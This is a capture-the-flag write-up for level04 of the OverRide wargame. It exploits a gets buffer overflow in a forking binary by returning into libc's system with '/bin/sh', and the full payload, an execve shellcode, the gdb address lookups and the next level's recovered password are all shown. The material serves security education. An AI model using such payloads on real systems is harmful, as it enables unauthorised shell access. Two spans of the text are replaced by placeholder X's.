# Level 04

Once logged in, you will see a binary.

```
$ ssh localhost -p 4444 -l level04
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level04@localhost's password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
level04@OverRide:~$ ls
level04
```

Once the program executes, it suddenly asks for a [shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php), so let's just provide one.

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
child is exiting...
level04@OverRide:~$
```

Okay, it seems like this didn't do anything. But, there is a hint given: `child is exiting...`.

In the decompiled source, we can see that the program `fork`s and the parent process watches the child process to see whether it calls `exec` ever. The child process takes input from the function `gets`, and once the child process finishes, the parent process exits as well. (If you haven't already, go take a look at the `source` file, which is relatively well documented.)

Given the fact that it seems we can't use our usual shellcode that uses `exec`, we'll use `system` instead. `share` and `exec` are [similar but different](https://stackoverflow.com/a/27461937). `system` technically uses `exec` as well, but only after performing a `fork`. Because the program forks before running `exec`, the original parent process in this program will not kill it. (Instead of `system`, we could theoretically create a shellcode that does `fork` and then `exec`, but `system` will do just fine here.)

Let's find the address of `system`, which we'll use instead of a shellcode.

```
gdb-peda$ info functions system
[....]
0xf7e6aed0  system
[...]
```

So `0xf7e6aed0` is the address for `system`.

Now we need to figure out how to get the string `"/bin/sh"` from somewhere. Unfortunately, it seems as if we can't use the buffer itself to store the string as it's overwritten during the call to `system`. XXXXXXXXXX because when the process is forked, although it will copy the whole process, [rather](https://stackoverflow.com/questions/51764013/fork-and-virtual-address-spaces#:~:text=What%20fork()%20does%20is,but%20not%20everything%20is%20copied.) XXXXXXXXXXXXX Instead, let's look and see if we can [find the string](https://stackoverflow.com/a/46226054) in the `libc`.

```
gdb-peda$ info proc map
process 2394
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fda000     0x2000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$ find "/bin/sh" 0xf7e2c000 0xf7fd0000
Searching for '/bin/sh' in range: 0xf7e2c000 - 0xf7fd0000
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
```

We'll use `0xf7f897ec` as our argument to `system` to start the shell.

Last, we'll find the offset we need to execute a [buffer overflow](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) on the `gets` call.

```
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41386541 ('Ae8A')
ECX: 0xf7fd08c4 --> 0x0
EDX: 0xffffd680 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
ESI: 0x0
EDI: 0x66413965 ('e9Af')
EBP: 0x31664130 ('0Af1')
ESP: 0xffffd720 ("f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
EIP: 0x41326641 ('Af2A')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41326641
[------------------------------------stack-------------------------------------]
0000| 0xffffd720 ("f3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0004| 0xffffd724 ("4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0008| 0xffffd728 ("Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0012| 0xffffd72c ("f7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0016| 0xffffd730 ("8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0020| 0xffffd734 ("Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0024| 0xffffd738 ("g1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
0028| 0xffffd73c ("2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41326641 in ?? ()
```

So the offset for overwriting `EIP` is `156`.

Our final exploit:

```
level04@OverRide:~$ python -c 'import struct; print "B"*(156) + struct.pack("I", 0xf7e6aed0) + "BBBB" + struct.pack("I", 0xf7f897ec)' > /tmp/payload
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## Helpful hints

### `strace`

Forking can be rather difficult to keep track of, and it can be useful to see which processes are running which commands. To do this, use `strace -f`. Note that running this exploit with `strace` will not work as `strace` is being run by `level04` as only calling `./level04` directly will run it as `level05`.

```
level04@OverRide:~$ python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"BBBB"+"\xec\x97\xf8\xf7"' > /tmp/payload
gdb-peda$ cat /tmp/payload - | strace -f ./level04 2> /tmp/err.txt
[ Process PID=1989 runs in 32 bit mode. ]
Give me some shellcode, k
[ Process PID=1991 runs in 64 bit mode. ]
whoami
level04
[ Process PID=1990 runs in 32 bit mode. ]
child is exiting...
gdb-peda$ cat /tmp/err.txt
execve("./level04", ["./level04"], [/* 20 vars */]) = 0
[...]
```

### Using GDB

For this level, using GDB is complicated because of the use of `fork`ing. In GDB, do [`set follow-fork-mode child`](https://ftp.gnu.org/old-gnu/Manuals/gdb/html_node/gdb_25.html) to follow the child process instead of the parent.
